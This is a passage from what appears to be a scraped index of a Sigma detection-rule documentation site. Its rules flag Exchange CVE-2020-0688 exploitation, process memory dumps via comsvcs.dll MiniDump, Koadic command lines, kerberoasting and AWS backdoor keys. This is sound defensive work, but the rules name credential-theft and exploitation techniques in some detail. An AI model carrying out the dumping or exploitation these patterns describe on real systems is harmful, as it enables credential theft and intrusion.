NIST CSF 1.1 PR.DS-1 # - NIST CSF 1.1 PR.DS-2 # - ISO 27002-2013 A.9.2.1 # - ISO 27002-2013 A.9.2.2 # - ISO 27002-2013 A.9.2.3 # - ISO 27002-2013 A.9.2.4 # - ISO 27002-2013 A.9.2.5 # - ISO 27002-2013 A.9.2.6 # - ISO 27002-2013 A.9.3.1 # - ISO 27002-2013 A.9.4.1 # - ISO 27002-2013 A.9.4.2 # - ISO 27002-2013 A.9.4.3 # - ISO 27002-2013 A.9.4.4 # - ISO 27002-2013 A.8.3.1 # - ISO 27002-2013 A.9.1.1 # - ISO 27002-2013 A.10.1.1 # - PCI DSS 3.2 2.1 # - PCI DSS 3.2 8.1 # - PCI DSS 3.2 8.2 # - PCI DSS 3.2 8.3 # - PCI DSS 3.2 8.7 # - PCI DSS 3.2 8.8 # - PCI DSS 3.2 1.3 # - PCI DSS 3.2 1.4 # - PCI DSS 3.2 4.3 # - PCI DSS 3.2 7.1 # - PCI DSS 3.2 7.2 # - PCI DSS 3.2 7.3 logsource: product: netflow detection: selection: destination.port: - 8080 - 21 - 80 - 23 - 50000 - 1521 - 27017 - 1433 - 11211 - 3306 - 15672 - 5900 - 5901 - 5902 - 5903 - 5904 condition: selection falsepositives: - unknown level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/compliance/netflow_cleartext_protocols.yml/","tags":null,"title":"Cleartext Protocol Usage"},{"categories":null,"contents":"Before deploying any new asset, change all default passwords to have values consistent with administrative level accounts. Sigma detects default credentials usage. Sigma for Qualys vulnerability scanner. Scan type - Vulnerability Management.\nKnown false-positives unknown References https://www.cisecurity.org/controls/cis-controls-list/ https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf https://community.qualys.com/docs/DOC-6406-reporting-toolbox-focused-search-lists Raw rule (edit) title: Default Credentials Usage id: 1a395cbc-a84a-463a-9086-ed8a70e573c7 status: stable description: Before deploying any new asset, change all default passwords to have values consistent with administrative level accounts. Sigma detects default credentials usage. Sigma for Qualys vulnerability scanner. Scan type - Vulnerability Management. author: Alexandr Yampolskyi, SOC Prime references: - https://www.cisecurity.org/controls/cis-controls-list/ - https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf - https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf - https://community.qualys.com/docs/DOC-6406-reporting-toolbox-focused-search-lists date: 2019/03/26 logsource: product: qualys detection: selection: host.scan.vuln: - 10693 - 11507 - 11633 - 11804 - 11821 - 11847 - 11867 - 11931 - 11935 - 11950 - 12541 - 12558 - 12559 - 12560 - 12562 - 12563 - 12565 - 12587 - 12590 - 12599 - 12702 - 12705 - 12706 - 12907 - 12928 - 12929 - 13053 - 13178 - 13200 - 13218 - 13241 - 13253 - 13274 - 13296 - 13301 - 13327 - 13373 - 13374 - 13409 - 13530 - 13532 - 20065 - 20073 - 20081 - 27202 - 27358 - 38702 - 38719 - 42045 - 42417 - 43029 - 43220 - 43221 - 43222 - 43223 - 43225 - 43246 - 43431 - 43484 - 86857 - 87098 - 87106 condition: selection falsepositives: - unknown level: medium # tags: # - CSC4 # - CSC4.2 # - NIST CSF 1.1 PR.AC-4 # - NIST CSF 1.1 PR.AT-2 # - NIST CSF 1.1 PR.MA-2 # - NIST CSF 1.1 PR.PT-3 # - ISO 27002-2013 A.9.1.1 # - ISO 27002-2013 A.9.2.2 # - ISO 27002-2013 A.9.2.3 # - ISO 27002-2013 A.9.2.4 # - ISO 27002-2013 A.9.2.5 # - ISO 27002-2013 A.9.2.6 # - ISO 27002-2013 A.9.3.1 # - ISO 27002-2013 A.9.4.1 # - ISO 27002-2013 A.9.4.2 # - ISO 27002-2013 A.9.4.3 # - ISO 27002-2013 A.9.4.4 # - PCI DSS 3.2 2.1 # - PCI DSS 3.2 7.1 # - PCI DSS 3.2 7.2 # - PCI DSS 3.2 7.3 # - PCI DSS 3.2 8.1 # - PCI DSS 3.2 8.2 # - PCI DSS 3.2 8.3 # - PCI DSS 3.2 8.7 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/compliance/default_credentials_usage.yml/","tags":null,"title":"Default Credentials Usage"},{"categories":null,"contents":"Configure systems to issue a log entry and alert when an account is added to or removed from any group assigned administrative privileges. Sigma detects\\ \\ Event ID 4728 indicates a \\u2018Member is added to a Security Group\\u2019. Event ID 4729 indicates a \\u2018Member is removed from a Security enabled-group\\u2019\\ . Event ID 4730 indicates a\\u2018Security Group is deleted\\u2019. The case is not applicable for Unix OS. Supported OS - Windows 2008 R2 and 7, Windows 2012 R2\\ \\ and 8.1, Windows 2016 and 10 Windows Server 2019, Windows Server 2000, Windows 2003 and XP.\nKnown false-positives unknown References https://www.cisecurity.org/controls/cis-controls-list/ https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728 https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4729 https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4730 https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=633 https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=632 https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=634 Raw rule (edit) title: Group Modification Logging id: 9cf01b6c-e723-4841-a868-6d7f8245ca6e status: stable description: \u0026#39;Configure systems to issue a log entry and alert when an account is added to or removed from any group assigned administrative privileges. Sigma detects\\ \\ Event ID 4728 indicates a \\u2018Member is added to a Security Group\\u2019. Event ID 4729 indicates a \\u2018Member is removed from a Security enabled-group\\u2019\\ . Event ID 4730 indicates a\\u2018Security Group is deleted\\u2019. The case is not applicable for Unix OS. Supported OS - Windows 2008 R2 and 7, Windows 2012 R2\\ \\ and 8.1, Windows 2016 and 10 Windows Server 2019, Windows Server 2000, Windows 2003 and XP.\u0026#39; author: Alexandr Yampolskyi, SOC Prime date: 2019/03/26 references: - https://www.cisecurity.org/controls/cis-controls-list/ - https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf - https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728 - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4729 - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4730 - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=633 - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=632 - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=634 logsource: product: windows service: security detection: selection: EventID: - 4728 - 4729 - 4730 - 633 - 632 - 634 condition: selection falsepositives: - unknown level: low # tags: # - CSC4 # - CSC4.8 # - NIST CSF 1.1 PR.AC-4 # - NIST CSF 1.1 PR.AT-2 # - NIST CSF 1.1 PR.MA-2 # - NIST CSF 1.1 PR.PT-3 # - ISO 27002-2013 A.9.1.1 # - ISO 27002-2013 A.9.2.2 # - ISO 27002-2013 A.9.2.3 # - ISO 27002-2013 A.9.2.4 # - ISO 27002-2013 A.9.2.5 # - ISO 27002-2013 A.9.2.6 # - ISO 27002-2013 A.9.3.1 # - ISO 27002-2013 A.9.4.1 # - ISO 27002-2013 A.9.4.2 # - ISO 27002-2013 A.9.4.3 # - ISO 27002-2013 A.9.4.4 # - PCI DSS 3.2 2.1 # - PCI DSS 3.2 7.1 # - PCI DSS 3.2 7.2 # - PCI DSS 3.2 7.3 # - PCI DSS 3.2 8.1 # - PCI DSS 3.2 8.2 # - PCI DSS 3.2 8.3 # - PCI DSS 3.2 8.7 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/compliance/group_modification_logging.yml/","tags":null,"title":"Group Modification Logging"},{"categories":null,"contents":"Host Without Firewall. Alert means not complied. Sigma for Qualys vulnerability scanner. Scan type - Vulnerability Management.\nReferences https://www.cisecurity.org/controls/cis-controls-list/ https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf Raw rule (edit) title: Host Without Firewall id: 6b2066c8-3dc7-4db7-9db0-6cc1d7b0dde9 status: stable description: Host Without Firewall. Alert means not complied. Sigma for Qualys vulnerability scanner. Scan type - Vulnerability Management. author: Alexandr Yampolskyi, SOC Prime date: 2019/03/19 modified: 2021/05/30 references: - https://www.cisecurity.org/controls/cis-controls-list/ - https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf - https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf logsource: product: qualys detection: selection: event.category: Security Policy host.scan.vuln_name: Firewall Product Not Detected* condition: selection level: low # tags: # - CSC9 # - CSC9.4 # - NIST CSF 1.1 PR.AC-5 # - NIST CSF 1.1 PR.AC-6 # - NIST CSF 1.1 PR.AC-7 # - NIST CSF 1.1 DE.AE-1 # - ISO 27002-2013 A.9.1.2 # - ISO 27002-2013 A.13.2.1 # - ISO 27002-2013 A.13.2.2 # - ISO 27002-2013 A.14.1.2 # - PCI DSS 3.2 1.4 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/compliance/host_without_firewall.yml/","tags":null,"title":"Host Without Firewall"},{"categories":null,"contents":"Automatically lock workstation sessions after a standard period of inactivity. The case is not applicable for Unix OS. Supported OS - Windows 2008 R2 and 7, Windows 2012 R2 and 8.1, Windows 2016 and 10 Windows Server 2019.\nKnown false-positives unknown References https://www.cisecurity.org/controls/cis-controls-list/ https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4800 Raw rule (edit) title: Locked Workstation id: 411742ad-89b0-49cb-a7b0-3971b5c1e0a4 status: stable description: Automatically lock workstation sessions after a standard period of inactivity. The case is not applicable for Unix OS. Supported OS - Windows 2008 R2 and 7, Windows 2012 R2 and 8.1, Windows 2016 and 10 Windows Server 2019. author: Alexandr Yampolskyi, SOC Prime date: 2019/03/26 references: - https://www.cisecurity.org/controls/cis-controls-list/ - https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf - https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4800 logsource: product: windows service: security detection: selection: EventID: - 4800 condition: selection falsepositives: - unknown level: low # tags: # - CSC16 # - CSC16.11 # - ISO27002-2013 A.9.1.1 # - ISO27002-2013 A.9.2.1 # - ISO27002-2013 A.9.2.2 # - ISO27002-2013 A.9.2.3 # - ISO27002-2013 A.9.2.4 # - ISO27002-2013 A.9.2.5 # - ISO27002-2013 A.9.2.6 # - ISO27002-2013 A.9.3.1 # - ISO27002-2013 A.9.4.1 # - ISO27002-2013 A.9.4.3 # - ISO27002-2013 A.11.2.8 # - PCI DSS 3.1 7.1 # - PCI DSS 3.1 7.2 # - PCI DSS 3.1 7.3 # - PCI DSS 3.1 8.7 # - PCI DSS 3.1 8.8 # - NIST CSF 1.1 PR.AC-1 # - NIST CSF 1.1 PR.AC-4 # - NIST CSF 1.1 PR.AC-6 # - NIST CSF 1.1 PR.AC-7 # - NIST CSF 1.1 PR.PT-3 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/compliance/workstation_was_locked.yml/","tags":null,"title":"Locked Workstation"},{"categories":null,"contents":"Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688\nKnown false-positives Unknown References https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/ Raw rule (edit) title: CVE-2020-0688 Exchange Exploitation via Web Log id: fce2c2e2-0fb5-41ab-a14c-5391e1fd70a5 status: test description: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688 author: Florian Roth references: - https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/ date: 2020/02/29 modified: 2021/11/27 logsource: category: webserver detection: selection1: cs-method: \u0026#39;GET\u0026#39; c-uri|contains: - \u0026#39;/ecp/\u0026#39; - \u0026#39;/owa/\u0026#39; selection2: c-uri|contains: \u0026#39;__VIEWSTATE=\u0026#39; condition: selection1 and selection2 fields: - c-ip - c-dns falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2020_0688_msexchange.yml/","tags":["attack.initial_access","attack.t1190"],"title":"CVE-2020-0688 Exchange Exploitation via Web Log"},{"categories":null,"contents":"Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688\nKnown false-positives Unknown References https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/ https://cyberpolygon.com/materials/okhota-na-ataki-ms-exchange-chast-2-cve-2020-0688-cve-2020-16875-cve-2021-24085/ Raw rule (edit) title: CVE-2020-0688 Exploitation via Eventlog id: d6266bf5-935e-4661-b477-78772735a7cb status: experimental description: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688 references: - https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/ - https://cyberpolygon.com/materials/okhota-na-ataki-ms-exchange-chast-2-cve-2020-0688-cve-2020-16875-cve-2021-24085/ author: Florian Roth, wagga date: 2020/02/29 modified: 2021/10/13 tags: - attack.initial_access - attack.t1190 logsource: product: windows service: application detection: selection1: EventID: 4 Provider_Name: \u0026#39;MSExchange Control Panel\u0026#39; Level: Error selection2: - \u0026#39;\u0026amp;__VIEWSTATE=\u0026#39; condition: selection1 and selection2 falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/application/win_vul_cve_2020_0688.yml/","tags":["attack.initial_access","attack.t1190"],"title":"CVE-2020-0688 Exploitation via Eventlog"},{"categories":null,"contents":"Detects CVE-2020-0688 Exploitation attempts\nKnown false-positives Unknown References https://github.com/Ridter/cve-2020-0688 Raw rule (edit) title: CVE-2020-0688 Exploitation Attempt id: 7c64e577-d72e-4c3d-9d75-8de6d1f9146a status: test description: Detects CVE-2020-0688 Exploitation attempts author: NVISO references: - https://github.com/Ridter/cve-2020-0688 date: 2020/02/27 modified: 2021/11/27 logsource: category: webserver detection: selection: c-uri|contains|all: - \u0026#39;/ecp/default.aspx\u0026#39; - \u0026#39;__VIEWSTATEGENERATOR=\u0026#39; - \u0026#39;__VIEWSTATE=\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_exchange_cve_2020_0688_exploit.yml/","tags":["attack.initial_access","attack.t1190"],"title":"CVE-2020-0688 Exploitation Attempt"},{"categories":null,"contents":"Detects Kerberos DLL being loaded by an Office Product\nKnown false-positives Alerts on legitimate macro usage as well, will need to filter as appropriate References https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16 Raw rule (edit) title: Active Directory Kerberos DLL Loaded Via Office Applications id: 7417e29e-c2e7-4cf6-a2e8-767228c64837 status: test description: Detects Kerberos DLL being loaded by an Office Product author: Antonlovesdnb references: - https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16 date: 2020/02/19 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - \u0026#39;\\winword.exe\u0026#39; - \u0026#39;\\powerpnt.exe\u0026#39; - \u0026#39;\\excel.exe\u0026#39; - \u0026#39;\\outlook.exe\u0026#39; ImageLoaded|endswith: - \u0026#39;\\kerberos.dll\u0026#39; condition: selection falsepositives: - Alerts on legitimate macro usage as well, will need to filter as appropriate level: high tags: - attack.execution - attack.t1204.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_susp_office_kerberos_dll_load.yml/","tags":["attack.execution","attack.t1204.002"],"title":"Active Directory Kerberos DLL Loaded Via Office Applications"},{"categories":null,"contents":"Detects DSParse DLL being loaded by an Office Product\nKnown false-positives Alerts on legitimate macro usage as well, will need to filter as appropriate References https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16 Raw rule (edit) title: Active Directory Parsing DLL Loaded Via Office Applications id: a2a3b925-7bb0-433b-b508-db9003263cc4 status: test description: Detects DSParse DLL being loaded by an Office Product author: Antonlovesdnb references: - https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16 date: 2020/02/19 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - \u0026#39;\\winword.exe\u0026#39; - \u0026#39;\\powerpnt.exe\u0026#39; - \u0026#39;\\excel.exe\u0026#39; - \u0026#39;\\outlook.exe\u0026#39; ImageLoaded|contains: - \u0026#39;\\dsparse.dll\u0026#39; condition: selection falsepositives: - Alerts on legitimate macro usage as well, will need to filter as appropriate level: high tags: - attack.execution - attack.t1204.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_susp_office_dsparse_dll_load.yml/","tags":["attack.execution","attack.t1204.002"],"title":"Active Directory Parsing DLL Loaded Via Office Applications"},{"categories":null,"contents":"Detects CLR DLL being loaded by an Office Product\nKnown false-positives Alerts on legitimate macro usage as well, will need to filter as appropriate References https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16 Raw rule (edit) title: CLR DLL Loaded Via Office Applications id: d13c43f0-f66b-4279-8b2c-5912077c1780 status: test description: Detects CLR DLL being loaded by an Office Product author: Antonlovesdnb references: - https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16 date: 2020/02/19 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - \u0026#39;\\winword.exe\u0026#39; - \u0026#39;\\powerpnt.exe\u0026#39; - \u0026#39;\\excel.exe\u0026#39; - \u0026#39;\\outlook.exe\u0026#39; ImageLoaded|contains: - \u0026#39;\\clr.dll\u0026#39; condition: selection falsepositives: - Alerts on legitimate macro usage as well, will need to filter as appropriate level: high tags: - attack.execution - attack.t1204.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_susp_office_dotnet_clr_dll_load.yml/","tags":["attack.execution","attack.t1204.002"],"title":"CLR DLL Loaded Via Office Applications"},{"categories":null,"contents":"Detects any assembly DLL being loaded by an Office Product\nKnown false-positives Alerts on legitimate macro usage as well, will need to filter as appropriate References https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16 Raw rule (edit) title: dotNET DLL Loaded Via Office Applications id: ff0f2b05-09db-4095-b96d-1b75ca24894a status: test description: Detects any assembly DLL being loaded by an Office Product author: Antonlovesdnb references: - https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16 date: 2020/02/19 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - \u0026#39;\\winword.exe\u0026#39; - \u0026#39;\\powerpnt.exe\u0026#39; - \u0026#39;\\excel.exe\u0026#39; - \u0026#39;\\outlook.exe\u0026#39; ImageLoaded|startswith: - \u0026#39;C:\\Windows\\assembly\\\u0026#39; condition: selection falsepositives: - Alerts on legitimate macro usage as well, will need to filter as appropriate level: high tags: - attack.execution - attack.t1204.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_susp_office_dotnet_assembly_dll_load.yml/","tags":["attack.execution","attack.t1204.002"],"title":"dotNET DLL Loaded Via Office Applications"},{"categories":null,"contents":"Detects any GAC DLL being loaded by an Office Product\nKnown false-positives Alerts on legitimate macro usage as well, will need to filter as appropriate References https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16 Raw rule (edit) title: GAC DLL Loaded Via Office Applications id: 90217a70-13fc-48e4-b3db-0d836c5824ac status: test description: Detects any GAC DLL being loaded by an Office Product author: Antonlovesdnb references: - https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16 date: 2020/02/19 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - \u0026#39;\\winword.exe\u0026#39; - \u0026#39;\\powerpnt.exe\u0026#39; - \u0026#39;\\excel.exe\u0026#39; - \u0026#39;\\outlook.exe\u0026#39; ImageLoaded|startswith: - \u0026#39;C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\u0026#39; condition: selection falsepositives: - Alerts on legitimate macro usage as well, will need to filter as appropriate level: high tags: - attack.execution - attack.t1204.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_susp_office_dotnet_gac_dll_load.yml/","tags":["attack.execution","attack.t1204.002"],"title":"GAC DLL Loaded Via Office Applications"},{"categories":null,"contents":"Detects DLL\u0026rsquo;s Loaded Via Word Containing VBA Macros\nKnown false-positives Alerts on legitimate macro usage as well, will need to filter as appropriate References https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16 Raw rule (edit) title: VBA DLL Loaded Via Microsoft Word id: e6ce8457-68b1-485b-9bdd-3c2b5d679aa9 status: test description: Detects DLL\u0026#39;s Loaded Via Word Containing VBA Macros author: Antonlovesdnb references: - https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16 date: 2020/02/19 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - \u0026#39;\\winword.exe\u0026#39; - \u0026#39;\\powerpnt.exe\u0026#39; - \u0026#39;\\excel.exe\u0026#39; - \u0026#39;\\outlook.exe\u0026#39; ImageLoaded|endswith: - \u0026#39;\\VBE7.DLL\u0026#39; - \u0026#39;\\VBEUI.DLL\u0026#39; - \u0026#39;\\VBE7INTL.DLL\u0026#39; condition: selection falsepositives: - Alerts on legitimate macro usage as well, will need to filter as appropriate level: high tags: - attack.execution - attack.t1204.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_susp_winword_vbadll_load.yml/","tags":["attack.execution","attack.t1204.002"],"title":"VBA DLL Loaded Via Microsoft Word"},{"categories":null,"contents":"Alerts on trust record modification within the registry, indicating usage of macros\nKnown false-positives Alerts on legitimate macro usage as well, will need to filter as appropriate References https://outflank.nl/blog/2018/01/16/hunting-for-evil-detect-macros-being-executed/ http://az4n6.blogspot.com/2016/02/more-on-trust-records-macros-and.html Raw rule (edit) title: Windows Registry Trust Record Modification id: 295a59c1-7b79-4b47-a930-df12c15fc9c2 status: test description: Alerts on trust record modification within the registry, indicating usage of macros author: Antonlovesdnb references: - https://outflank.nl/blog/2018/01/16/hunting-for-evil-detect-macros-being-executed/ - http://az4n6.blogspot.com/2016/02/more-on-trust-records-macros-and.html date: 2020/02/19 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: TargetObject|contains: \u0026#39;TrustRecords\u0026#39; condition: selection falsepositives: - Alerts on legitimate macro usage as well, will need to filter as appropriate level: medium tags: - attack.initial_access - attack.t1566.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_trust_record_modification.yml/","tags":["attack.initial_access","attack.t1566.001"],"title":"Windows Registry Trust Record Modification"},{"categories":null,"contents":"Detects a process memory dump performed via ordinal function 24 in comsvcs.dll\nKnown false-positives Unlikely, because no one should dump the process memory in that way References https://twitter.com/shantanukhande/status/1229348874298388484 https://twitter.com/pythonresponder/status/1385064506049630211?s=21 https://twitter.com/Hexacorn/status/1224848930795552769 Raw rule (edit) title: Process Dump via Rundll32 and Comsvcs.dll id: 646ea171-dded-4578-8a4d-65e9822892e3 description: Detects a process memory dump performed via ordinal function 24 in comsvcs.dll status: experimental references: - https://twitter.com/shantanukhande/status/1229348874298388484 - https://twitter.com/pythonresponder/status/1385064506049630211?s=21 - https://twitter.com/Hexacorn/status/1224848930795552769 author: Florian Roth date: 2020/02/18 modified: 2021/12/08 tags: - attack.defense_evasion - attack.t1036 - attack.credential_access - car.2013-05-009 - attack.t1003.001 logsource: category: process_creation product: windows detection: selection_comsvcs: CommandLine|contains: - \u0026#39;comsvcs.dll\u0026#39; - \u0026#39;rundll32\u0026#39; - \u0026#39;.dmp\u0026#39; selection_function: Commandline|contains: - \u0026#39;#24\u0026#39; - \u0026#39;#+24\u0026#39; - \u0026#39;MiniDump\u0026#39; selection_full: CommandLine|contains: \u0026#39; full\u0026#39; unique_selection: CommandLine|contains: \u0026#39;#-4294967272\u0026#39; # https://twitter.com/Hexacorn/status/1224848930795552769 condition: all of selection* or unique_selection falsepositives: - Unlikely, because no one should dump the process memory in that way level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_process_dump_rundll32_comsvcs.yml/","tags":["attack.defense_evasion","attack.t1036","attack.credential_access","car.2013-05-009","attack.t1003.001"],"title":"Process Dump via Rundll32 and Comsvcs.dll"},{"categories":null,"contents":"Detects command line parameters used by Koadic hack tool\nKnown false-positives Pentest References https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/ https://github.com/zerosum0x0/koadic/blob/master/data/stager/js/stdlib.js#L955 https://blog.f-secure.com/hunting-for-koadic-a-com-based-rootkit/ Raw rule (edit) title: Koadic Execution id: 5cddf373-ef00-4112-ad72-960ac29bac34 status: test description: Detects command line parameters used by Koadic hack tool author: wagga, Jonhnathan Ribeiro, oscd.community references: - https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/ - https://github.com/zerosum0x0/koadic/blob/master/data/stager/js/stdlib.js#L955 - https://blog.f-secure.com/hunting-for-koadic-a-com-based-rootkit/ date: 2020/01/12 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\cmd.exe\u0026#39; CommandLine|contains|all: - \u0026#39;/q\u0026#39; - \u0026#39;/c\u0026#39; - \u0026#39;chcp\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Pentest level: high tags: - attack.execution - attack.t1059.003 - attack.t1059.005 - attack.t1059.007 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_hack_koadic.yml/","tags":["attack.execution","attack.t1059.003","attack.t1059.005","attack.t1059.007"],"title":"Koadic Execution"},{"categories":null,"contents":"Detects kerberos TGS request using RC4 encryption which may be indicative of kerberoasting\nKnown false-positives normal enterprise SPN requests activity References https://adsecurity.org/?p=3458 Raw rule (edit) title: Kerberos Network Traffic RC4 Ticket Encryption id: 503fe26e-b5f2-4944-a126-eab405cc06e5 status: test description: Detects kerberos TGS request using RC4 encryption which may be indicative of kerberoasting author: sigma references: - https://adsecurity.org/?p=3458 date: 2020/02/12 modified: 2021/11/27 logsource: product: zeek service: kerberos detection: selection: request_type: \u0026#39;TGS\u0026#39; cipher: \u0026#39;rc4-hmac\u0026#39; computer_acct: service|startswith: \u0026#39;$\u0026#39; condition: selection and not computer_acct falsepositives: - normal enterprise SPN requests activity level: medium tags: - attack.credential_access - attack.t1558.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_susp_kerberos_rc4.yml/","tags":["attack.credential_access","attack.t1558.003"],"title":"Kerberos Network Traffic RC4 Ticket Encryption"},{"categories":null,"contents":"Detects changes to the EC2 instance startup script. The shell script will be executed as root/SYSTEM every time the specific instances are booted up.\nKnown false-positives Valid changes to the startup script References https://github.com/RhinoSecurityLabs/pacu/blob/master/modules/ec2__startup_shell_script/main.py#L9 Raw rule (edit) title: AWS EC2 Startup Shell Script Change id: 1ab3c5ed-5baf-417b-bb6b-78ca33f6c3df status: experimental description: Detects changes to the EC2 instance startup script. The shell script will be executed as root/SYSTEM every time the specific instances are booted up. author: faloker date: 2020/02/12 modified: 2021/08/09 references: - https://github.com/RhinoSecurityLabs/pacu/blob/master/modules/ec2__startup_shell_script/main.py#L9 logsource: product: aws service: cloudtrail detection: selection_source: eventSource: ec2.amazonaws.com requestParameters.userData: \u0026#39;*\u0026#39; eventName: ModifyInstanceAttribute condition: selection_source falsepositives: - Valid changes to the startup script level: high tags: - attack.execution - attack.t1059.001 - attack.t1059.003 - attack.t1059.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_ec2_startup_script_change.yml/","tags":["attack.execution","attack.t1059.001","attack.t1059.003","attack.t1059.004"],"title":"AWS EC2 Startup Shell Script Change"},{"categories":null,"contents":"Detects AWS API key creation for a user by another user. Backdoored users can be used to obtain persistence in the AWS environment. Also with this alert, you can detect a flow of AWS keys in your org.\nKnown false-positives Adding user keys to their own accounts (the filter cannot cover all possible variants of user naming) AWS API keys legitimate exchange workflows References https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__backdoor_users_keys/main.py Raw rule (edit) title: AWS IAM Backdoor Users Keys id: 0a5177f4-6ca9-44c2-aacf-d3f3d8b6e4d2 status: experimental description: Detects AWS API key creation for a user by another user. Backdoored users can be used to obtain persistence in the AWS environment. Also with this alert, you can detect a flow of AWS keys in your org. author: faloker date: 2020/02/12 modified: 2021/08/20 references: - https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__backdoor_users_keys/main.py logsource: product: aws 